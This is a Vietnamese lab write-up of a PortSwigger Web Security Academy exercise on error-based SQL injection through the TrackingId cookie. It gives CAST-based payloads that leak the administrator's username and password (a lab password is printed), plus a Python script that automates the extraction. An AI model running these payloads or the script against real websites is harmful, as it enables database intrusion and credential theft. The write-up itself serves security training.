![Giao diện lab ban đầu](images/Pasted%20image%2020260612100058.png)
# Tổng quan
-Lab sử dụng tracking cookie để truy vấn query SQL,Kết quả của câu lệnh SQL sẽ không được trả về
-Database có table là `users` với các bảng là `username` và `password` .Mục tiêu là tìm cách để leak ra `password` của `administrator`
# Khai thác
**Cách 1:**
-Trước hết ta biết được SQLi ở tracking cookie là `TrackingId` ta dùng `Burp Repeater` thử thêm `'` để xem response:
![Thêm dấu nháy đơn vào TrackingId để xem lỗi SQL](images/Pasted%20image%2020260612100946.png)
Ta có thể thấy web trả về lỗi truy vấn 
```ERROR
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'Jnk8CcPL52mMMKUL''. Expected  char
```
Với lỗi truy vấn như này,ta biết được câu lệnh SQL mà trang web sử dụng:
```SQL
SELECT * FROM tracking WHERE id = 'Jnk8CcPL52mMMKUL'
```
Ta sử dụng tiếp payload:
```SQL
' AND CAST((SELECT 1) AS INT)--
```
![Payload CAST SELECT 1 bị lỗi kiểu dữ liệu boolean](images/Pasted%20image%2020260612101727.png)

Web có trả về lỗi:
```ERROR
ERROR: argument of AND must be type boolean, not type integer
  Position: 63
```
Vậy câu truy vấn ta cần phải là type boolean vậy ta thêm `1=` ở đằng trước `CAST`:
```SQL
' AND 1=CAST((SELECT 1) AS INT)--
```
![Thêm 1= trước CAST để trả về điều kiện boolean](images/Pasted%20image%2020260612102006.png)
Lúc này response trả về bình thường.

Tiếp theo ta thử:
```SQL
' AND 1=CAST((SELECT username FROM users) AS INT)--
```
![Thử CAST SELECT username FROM users](images/Pasted%20image%2020260612102257.png)
Ta thấy phần response bị nuốt đến `AS` vậy ta thử xóa đi value của cookie đi thì sao?
![Xóa value cookie để xem lỗi đầy đủ](images/Pasted%20image%2020260612102429.png)
Và rồi ta thấy được response của web:
```ERROR
ERROR: more than one row returned by a subquery used as an expression
```
Vì câu `SELECT username FROM users` là một câu subquery chỉ được trả một dòng ta thêm `LIMIT 1` để cho câu truy vấn con này trả về 1 dòng:
```SQL
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS INT)--
```
<img width="2559" height="1239" alt="image" src="https://github.com/user-attachments/assets/34057c95-63a5-4454-8b21-1e9dd5bd0b21" />
Và vậy là hệ thống web đã leak ra username là `administrator`

Ta sẽ thử với cột `password` để xem có điều gì hay ho:
```SQL
' AND 1=CAST((SELECT password FROM users LIMIT 1) AS INT)--
```
![Leak password của administrator](images/Pasted%20image%2020260612103025.png)
Và done,ta đã tìm được password của administrator là `90rjlf3vfcc0u3jvaukm`
Việc còn lại của ta là đăng nhập với tài khoản `administrator` là xong.
![Đăng nhập administrator thành công](images/Pasted%20image%2020260612103408.png)
=> solved!
**Cách 2:**
Dựa cách phân tích như cách 1,thay vì dùng Burp ta dùng script Python:
```Python
import requests
import re

url = "https://0aaf007e041c6a6c822c1514001300d3.web-security-academy.net/"

s = requests.Session()
s.get(url)
tracking_id = s.cookies.get('TrackingId', '')

def extract_via_error():
    # Ép CAST vào 1= để tạo boolean context
    payload = f"' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--"
    s.cookies.set('TrackingId', payload)
    r = s.get(url)
    
    print(f"Status: {r.status_code}")
    
    for line in r.text.splitlines():
        if any(k in line.lower() for k in ['error', 'invalid', 'syntax', 'cast']):
            print(f">> {line.strip()}")
    match = re.search(r'invalid input syntax for type integer: "([^"]+)"', r.text)
    if match:
        print(f"[+] Password: {match.group(1)}")
extract_via_error()
```
Kết quả:


<img width="762" height="113" alt="image" src="https://github.com/user-attachments/assets/9c98cd92-5fb8-49bb-a3a7-8a68341d0387" />
